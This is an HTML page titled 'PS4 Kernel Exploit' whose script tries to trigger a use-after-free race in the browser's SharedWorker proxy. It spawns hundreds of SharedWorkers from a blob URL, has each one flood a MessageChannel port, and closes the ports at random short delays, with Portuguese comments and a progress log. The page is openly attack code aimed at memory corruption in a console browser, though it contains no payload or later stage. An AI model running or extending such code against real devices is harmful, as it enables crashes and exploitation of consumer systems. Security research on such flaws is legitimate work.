<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Kernel Exploit</title>      
</head>
<body>

    <div class="section">
        <h2>SharedWorkerProxy Use-After-Free</h2>       

        <button onclick="runSharedProxy()">SharedWorkerProxy</button>      
        
    </div>

    <div id="log"></div>
    <div id="dummy"></div>
    <div id="sandbox"></div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }      

       
        function runSharedProxy() {
            log("Iniciando Proxy Race...");
            
            const workerCode = `
                onmessage = (e) => {
                    const port = e.ports[0];
                    // Bombardeia a porta de volta
                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "race_" + i);
                sw.port.postMessage("init", [mc.port2]);
                
                // Fecha a porta local imediatamente (lado do proxy)
                // enquanto o worker bombardeia o outro lado
                setTimeout(() => {
                    sw.port.close(); // Tenta invalidar o proxy
                    mc.port1.close();
                }, Math.random() * 10);
                
                i++;
                if (i % 50 === 0) log(`Proxies destruidos: ${i}`);
                if (i > 500) clearInterval(interval);
            }, 20);
        }

    </script>
</body>
</html>
